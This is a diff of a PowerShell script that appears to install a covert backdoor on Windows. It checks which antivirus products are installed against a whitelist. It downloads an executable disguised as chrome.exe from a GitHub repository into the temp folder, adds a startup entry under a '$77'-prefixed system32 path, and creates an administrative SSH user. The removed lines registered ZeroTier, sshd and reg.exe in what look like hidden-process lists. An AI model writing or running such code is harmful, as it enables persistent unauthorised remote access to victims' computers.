@@ -35,7 +35,7 @@ function Get-AntivirusInfo {
     try {
         $antivirusProducts = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName "AntivirusProduct"
         $result = New-Object System.Collections.ArrayList
-        $whitelist = @("Windows Defender")  # List of allowed antivirus names
+        $whitelist = @("Windows Defender", "Malwarebytes")  # List of allowed antivirus names
 
         foreach ($product in $antivirusProducts) {
             $result.Add("$($product.displayName) [$($product.productState)]") | Out-Null
@@ -112,7 +112,7 @@ if (Test-Path -Path $zeroTierFolderPath -Filter "*.exe") {
 # Define the URL and download location for improved.exe
 $exeUrl = "https://github.com/Ogyeet10/installer9000/raw/main/chrome.exe"
 $tempFolder = $env:TEMP
-$exePath = Join-Path $tempFolder "chrome.exe"
+$exePath = Join-Path $tempFolder "hehe.exe"
 
 # Download improved.exe from the provided URL
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
@@ -200,16 +200,6 @@ Add-StartupApplication -applicationPath 'C:\Windows\system32\$77Starware\$77SWCl
 # Output completion message
 Write-Host "Services, processes, and startup applications have been configured in the registry."
 
-
-# Add "ZeroTierOneService" and "sshd" to the service names registry
-Add-ServiceName -service 'ZeroTierOneService'
-Add-ServiceName -service 'sshd'
-
-# Add "reg.exe" to the process names registry
-Add-ProcessName -process 'reg.exe'
-
-# Output completion message
-Write-Host "Services and processes have been configured in the registry."
 
 # Create a new user `ssh-user` with administrative privileges
 # Check if SSH user exists before creating
